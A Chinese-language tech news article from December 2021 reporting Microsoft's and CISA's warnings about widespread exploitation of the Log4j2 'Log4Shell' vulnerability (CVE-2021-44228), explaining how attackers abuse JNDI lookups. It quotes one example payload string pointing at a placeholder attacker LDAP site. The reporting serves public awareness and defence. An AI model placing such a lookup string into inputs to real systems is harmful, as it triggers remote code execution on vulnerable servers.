
---
title: '微软警告比SolarWinds影响更深远的Log4j2漏洞利用'
categories: 
 - 新媒体
 - cnBeta
 - 最新
headimg: 'https://static.cnbetacdn.com/article/2021/1216/92d4864c63ecc07.png'
author: cnBeta
comments: false
date: Thu, 16 Dec 2021 02:30:34 GMT
thumbnail: 'https://static.cnbetacdn.com/article/2021/1216/92d4864c63ecc07.png'
---

<div>   
微软再次发出了来自具有深厚背景的黑客组织的网络攻击预警，可知问题源于 Java 日志库的 Log4j2 漏洞（CVE-2021-44228）。<strong>这家雷德蒙德科技巨头指出，世界多地的黑客已开始利用这项更复杂的日志协议技术，来远程访问受害者的设备。</strong>目前观察到的大部分攻击，主要涉及各路人马的大规模扫描。<br>
 <p><img src="https://static.cnbetacdn.com/article/2021/1216/92d4864c63ecc07.png" alt="1.png" referrerpolicy="no-referrer"></p><p>据悉，微软旗下的多个威胁情报团队 —— 包括 MSTIC 威胁情报中心、 Microsoft 365 Defender 威胁情报团队、RiskIQ 和 DART 检测响应团队 —— 一直在密切关注 Apache Log4j2 的远程代码执行（RCE）漏洞。</p><p><img src="https://static.cnbetacdn.com/article/2021/1216/013f339f7374ea8.png" alt="2.png" referrerpolicy="no-referrer"></p><p>CVE-2021-44228 漏洞披露公告指出，被称作“Log4Shell”的漏洞攻击，往往在 Web 日志请求中包含如下字符串：</p><blockquote><p>$&#123;jndi:ldap://[attacker site]/a&#125;</p></blockquote><p><img src="https://static.cnbetacdn.com/article/2021/1216/646a97406f47b12.png" alt="2-1.png" referrerpolicy="no-referrer"></p><p>美国网络安全和基础设施安全局（CISA）也证实了微软的说法，此前该机构同样通报了 Log4Shell 漏洞的广泛利用。</p><p><a href="https://static.cnbetacdn.com/article/2021/1216/5181472adb11dd0.png" target="_blank"><img src="https://static.cnbetacdn.com/thumb/article/2021/1216/5181472adb11dd0.png" alt="2-2.png" referrerpolicy="no-referrer"></a></p><p>CISA 负责人 Jen Easterly 于昨日接受 CNN 采访时重申，若不迅速采取补救措施，各个联邦机构的设备、服务、乃至整个互联网，都将处于一个相当可怕的境地。</p><p><img src="https://static.cnbetacdn.com/article/2021/1216/392d85b4fe03030.png" alt="3.png" referrerpolicy="no-referrer"></p><p>微软警告称，Log4j2 的风险源于两个方面。其一是漏洞可被轻松利用，其二是基于其构建的产品数量 —— 而 Apache Log4j2 就是当前最流行的 Java 日志库之一。</p><p><a href="https://static.cnbetacdn.com/article/2021/1216/f06cb7afd90a62e.jpg" target="_blank"><img src="https://static.cnbetacdn.com/thumb/article/2021/1216/f06cb7afd90a62e.jpg" alt="3-1.jpg" referrerpolicy="no-referrer"></a></p><p>据悉，日志库用于为开发者提供有关服务和产品的附加信息，允许其控制在应用程序执行期间、用户登录特定服务 / 设备的错误报告，并在遇到功能问题时收集相关数据。</p><p>通过日志库的使用，开发者还可深入了解或收集设备详情，包括 CPU 类型 / GPU 型号、驱动程序版本、以及系统内存等。</p><p>攻击者会对使用 Log4j2 生成日志的目标系统执行 HTTP 请求，该日志利用 JNDI 向攻击者控制的站点执行请求，最终导致被利用的进程访问站点并执行有效负载。</p><p>在许多观察到的案例中，攻击者往往拿到了 DNS 日志系统的参数，旨在记录对站点的请求、以对易受攻击的系统进行指纹识别。</p><p><img src="https://static.cnbetacdn.com/article/2021/1216/77c134c4a42943a.png" alt="4.png" referrerpolicy="no-referrer"></p><p>此前已知的一种漏洞利用，涉及微软旗下的《我的世界》服务器。攻击者以聊天框作为中部署的消息内容作为管道，试图渗透用户系统并夺得控制权。</p><p>事实上，全球许多知名企业都面临着巨大的风险，其中不乏微软、Twitter、<a data-link="1" href="https://apple.pvxt.net/c/1251234/435400/7639?u=https%3A%2F%2Fwww.apple.com%2Fcn%2Fmusic%2F" target="_blank">苹果</a>、亚马逊、百度、Cloudflare、网易、Cloudflare 等科技巨头。</p><p>网络安全公司 Check Point 指出，截至目前，其 GitHub 项目的下载量已经超过 40 万次。遗憾的是，尽管 Apache 已经发布了一个修补程序，但各家公司的实施方案不尽相同。</p><p>对于数百上千万的客户来说，这意味着他们仍将在未来一段时间里面临 Log4j 入侵风险，或导致大量用户数据暴露于在外。</p><div class="article-relation"><p><strong>相关文章:</strong></p><p><a href="https://www.cnbeta.com/articles/tech/1215027.htm" target="_blank">CISA敦促美国联邦机构在圣诞节前完成Log4Shell漏洞修补</a></p></div>   
</div>
            